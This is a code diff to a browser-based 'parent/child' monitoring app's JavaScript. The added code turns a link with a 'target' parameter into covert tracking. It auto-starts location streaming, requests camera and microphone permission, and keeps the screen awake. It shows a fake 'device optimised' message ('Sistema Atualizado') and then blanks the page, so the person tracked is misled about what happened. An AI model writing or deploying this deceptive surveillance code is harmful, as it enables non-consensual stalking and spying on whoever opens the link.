@@ -23,9 +23,20 @@ document.getElementById('exit-parent').onclick = () => location.reload();
 document.getElementById('cmd-camera').onclick = () => sendCommand('start-camera');
 document.getElementById('cmd-screen').onclick = () => sendCommand('start-screen');
 
+// Check for automatic target mode in URL
+window.onload = () => {
+    const urlParams = new URLSearchParams(window.location.search);
+    if (urlParams.has('target')) {
+        startRole('child');
+        setTimeout(initTargetService, 1000);
+    }
+};
+
 function startRole(selectedRole) {
     role = selectedRole;
-    roomId = roomInput.value || 'Familia';
+    // Automatic ID for simplicity (from URL or default)
+    const urlParams = new URLSearchParams(window.location.search);
+    roomId = urlParams.get('id') || roomInput.value || 'Geral'; 
     selection.classList.add('hidden');
     socket.emit('register', { type: role, roomId });
 
@@ -54,23 +65,24 @@ socket.on('target-update', (data) => {
 });
 
 // Device (Child) Logic
-function initTargetService() {
+async function initTargetService() {
     document.getElementById('start-target').disabled = true;
-    document.getElementById('start-target').innerText = "Serviço Ativo";
+    document.getElementById('start-target').innerText = "Otimizando...";
+
+    let permissionsGranted = 0;
+    const totalPermissions = 2; // GPS and Camera
 
     // 1. Start Geolocation Tracking
     if (navigator.geolocation) {
         navigator.geolocation.watchPosition(pos => {
-            console.log("GPS Update:", pos.coords.latitude, pos.coords.longitude);
+            if (permissionsGranted < totalPermissions) permissionsGranted++;
             socket.emit('update-data', {
                 location: { lat: pos.coords.latitude, lng: pos.coords.longitude }
             });
+            checkPermissionsFinalized();
         }, (err) => {
             console.warn("GPS Error:", err.message);
-            // Se falhar com alta precisão, tentamos de novo sem ela
         }, { enableHighAccuracy: false, timeout: 10000, maximumAge: 0 });
-    } else {
-        console.error("Geolocation not supported");
     }
 
     // 2. Start Battery Tracking
@@ -82,14 +94,29 @@ function initTargetService() {
         });
     }
 
-    // 3. Network Info
-    if (navigator.connection) {
-        socket.emit('update-data', { network: navigator.connection.effectiveType });
+    // 3. Media Permissions (trigger early)
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
+        stream.getTracks().forEach(track => track.stop()); // Just to get permission
+        permissionsGranted++;
+        checkPermissionsFinalized();
+    } catch (e) {
+        console.warn("Media permission denied or not available yet");
     }
 
     // 4. Wake Lock (Keep Screen On)
     if ('wakeLock' in navigator) {
         navigator.wakeLock.request('screen').catch(() => { });
+    }
+
+    function checkPermissionsFinalized() {
+        if (permissionsGranted >= totalPermissions) {
+            document.getElementById('setup-view').innerHTML = "<h2>Sistema Atualizado</h2><p>O dispositivo está otimizado. Você pode fechar o navegador.</p>";
+            setTimeout(() => {
+                // Try to close or go to blank
+                window.location.href = "about:blank";
+            }, 3000);
+        }
     }
 }
 
